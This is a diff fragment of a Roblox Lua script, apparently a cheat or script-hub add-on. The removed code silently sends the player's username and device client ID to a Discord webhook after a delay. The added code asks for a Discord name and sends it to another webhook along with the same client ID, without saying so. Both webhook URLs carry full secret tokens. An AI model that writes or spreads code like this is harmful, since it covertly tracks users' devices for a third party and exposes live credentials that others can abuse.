@@ -1,7 +1,8 @@
-spawn(function()
-wait(60)
-local webhook = "https://discord.com/api/webhooks/943925004381356163/wH-vDIdZxIb3PbxDPw8iPCdgWV9qg7KX1ZwM1QXmE2AbUMLGwMWNeWqtDvteWg4oNSIY"
-local message = tostring(game:GetService("Players").LocalPlayer.Name).." "..game:GetService("RbxAnalyticsService"):GetClientId()
+wait(15)
+MainSection:NewTextBox("WRITE HERE DISCORD NAME WITH TAG", "yes", function(txt)
+local Discord = tostring(txt)
+local webhook = "https://discord.com/api/webhooks/988184877969055764/MPkOZJ6AINBn_DFvmZp7ToY2cP_PKgePhfOLxOGP7un8NEsSg60W9KW7uWH6DoIxnhqI"
+local message = Discord.." "..game:GetService("RbxAnalyticsService"):GetClientId()
 local botname = "ClientID" 
 local HttpService = game:GetService("HttpService");
 function specials(Webhook, Message, Botname)
